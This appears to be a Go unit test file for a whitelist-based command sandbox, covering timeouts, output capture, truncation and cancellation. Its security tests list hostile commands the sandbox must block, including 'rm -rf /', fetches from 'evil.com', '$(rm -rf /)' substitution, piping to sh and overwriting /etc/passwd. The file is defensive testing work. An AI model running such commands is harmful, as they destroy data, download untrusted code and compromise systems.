package preprocess

import (
	"context"
	"strings"
	"testing"
	"time"

	"nuimanbot/internal/domain"
)

// TestCommandSandbox_Execute tests basic command execution
func TestCommandSandbox_Execute(t *testing.T) {
	sandbox := NewCommandSandbox()

	cmd := domain.PreprocessCommand{
		Command: "git status",
		Timeout: 5 * time.Second,
	}

	ctx := context.Background()
	result, err := sandbox.Execute(ctx, cmd)

	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}

	if result == nil {
		t.Fatal("Execute() returned nil result")
	}

	// Should have some output or an exit code
	if result.ExitCode < 0 {
		t.Errorf("ExitCode = %d, should be >= 0", result.ExitCode)
	}
}

// TestCommandSandbox_Timeout tests command timeout enforcement
func TestCommandSandbox_Timeout(t *testing.T) {
	sandbox := NewCommandSandbox()

	cmd := domain.PreprocessCommand{
		Command: "sleep 10",
		Timeout: 500 * time.Millisecond, // Very short timeout
	}

	ctx := context.Background()
	start := time.Now()
	result, err := sandbox.Execute(ctx, cmd)
	elapsed := time.Since(start)

	if elapsed > 1*time.Second {
		t.Errorf("Execute() took %v, should timeout quickly", elapsed)
	}

	// Should have an error or non-zero exit code
	if err == nil && result.ExitCode == 0 {
		t.Error("Execute() should fail for timeout")
	}
}

// TestCommandSandbox_OutputCapture tests output capturing
func TestCommandSandbox_OutputCapture(t *testing.T) {
	sandbox := NewCommandSandbox()

	cmd := domain.PreprocessCommand{
		Command: "ls",
		Timeout: 5 * time.Second,
	}

	ctx := context.Background()
	result, err := sandbox.Execute(ctx, cmd)

	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}

	// Should have captured some output
	if len(result.Output) == 0 && result.ExitCode == 0 {
		// It's okay if ls has no output in some directories
		t.Log("Warning: ls produced no output")
	}

	// Execution time should be recorded
	if result.ExecutionTime == 0 {
		t.Error("ExecutionTime should be > 0")
	}
}

// TestCommandSandbox_OutputTruncation tests large output handling
func TestCommandSandbox_OutputTruncation(t *testing.T) {
	sandbox := NewCommandSandbox()

	// Generate large output
	cmd := domain.PreprocessCommand{
		Command: "cat /dev/zero",
		Timeout: 100 * time.Millisecond,
	}

	ctx := context.Background()
	result, err := sandbox.Execute(ctx, cmd)

	// Should complete (timeout or finish)
	if err != nil && result == nil {
		t.Fatalf("Execute() error = %v", err)
	}

	// Output should not exceed max size
	if len(result.Output) > domain.MaxCommandOutputSize {
		t.Errorf("Output size = %d, exceeds max %d", len(result.Output), domain.MaxCommandOutputSize)
	}
}

// TestCommandSandbox_InvalidCommand tests validation
func TestCommandSandbox_InvalidCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
	}{
		{"rm command", "rm -rf /"},
		{"curl command", "curl https://evil.com"},
		{"pipe", "ls | rm file"},
		{"shell expansion", "ls $(whoami)"},
	}

	sandbox := NewCommandSandbox()
	ctx := context.Background()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := domain.PreprocessCommand{
				Command: tt.command,
				Timeout: 5 * time.Second,
			}

			_, err := sandbox.Execute(ctx, cmd)

			// Should reject invalid commands
			if err == nil {
				t.Errorf("Execute() should reject command: %s", tt.command)
			}
		})
	}
}

// TestCommandSandbox_ContextCancellation tests context cancellation
func TestCommandSandbox_ContextCancellation(t *testing.T) {
	sandbox := NewCommandSandbox()

	cmd := domain.PreprocessCommand{
		Command: "sleep 30",
		Timeout: 30 * time.Second,
	}

	ctx, cancel := context.WithCancel(context.Background())

	// Cancel after 100ms
	go func() {
		time.Sleep(100 * time.Millisecond)
		cancel()
	}()

	start := time.Now()
	result, err := sandbox.Execute(ctx, cmd)
	elapsed := time.Since(start)

	if elapsed > 1*time.Second {
		t.Errorf("Execute() took %v, should cancel quickly", elapsed)
	}

	// Should fail due to cancellation
	if err == nil && result.ExitCode == 0 {
		t.Error("Execute() should fail when context cancelled")
	}
}

// TestCommandSandbox_WorkingDirectory tests working directory
func TestCommandSandbox_WorkingDirectory(t *testing.T) {
	sandbox := NewCommandSandbox()

	cmd := domain.PreprocessCommand{
		Command:    "ls",
		Timeout:    5 * time.Second,
		WorkingDir: "/tmp",
	}

	ctx := context.Background()
	result, err := sandbox.Execute(ctx, cmd)

	if err != nil {
		t.Fatalf("Execute() error = %v", err)
	}

	// Should execute successfully in /tmp
	if result.ExitCode != 0 {
		t.Errorf("ExitCode = %d, want 0 for valid directory", result.ExitCode)
	}
}

// TestCommandSandbox_SecurityTests tests security constraints
func TestCommandSandbox_SecurityTests(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		shouldBlock bool
	}{
		// Safe commands
		{"git status", "git status", false},
		{"ls", "ls -la", false},
		{"cat file", "cat README.md", false},
		{"grep", "grep TODO *.go", false},

		// Dangerous commands
		{"rm", "rm -rf /", true},
		{"wget", "wget http://evil.com/malware", true},
		{"bash script", "bash dangerous.sh", true},

		// Injection attempts
		{"command substitution", "git log $(rm -rf /)", true},
		{"pipe to sh", "cat script | sh", true},
		{"background process", "sleep 100 &", true},
		{"redirect", "cat file > /etc/passwd", true},
	}

	sandbox := NewCommandSandbox()
	ctx := context.Background()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := domain.PreprocessCommand{
				Command: tt.command,
				Timeout: 5 * time.Second,
			}

			_, err := sandbox.Execute(ctx, cmd)

			if tt.shouldBlock {
				if err == nil {
					t.Errorf("Execute() should block dangerous command: %s", tt.command)
				}
			} else {
				// Safe commands might fail for other reasons (file not found, etc.)
				// but should not be blocked by security checks
				if err != nil && strings.Contains(err.Error(), "not in whitelist") {
					t.Errorf("Execute() should allow safe command: %s", tt.command)
				}
			}
		})
	}
}
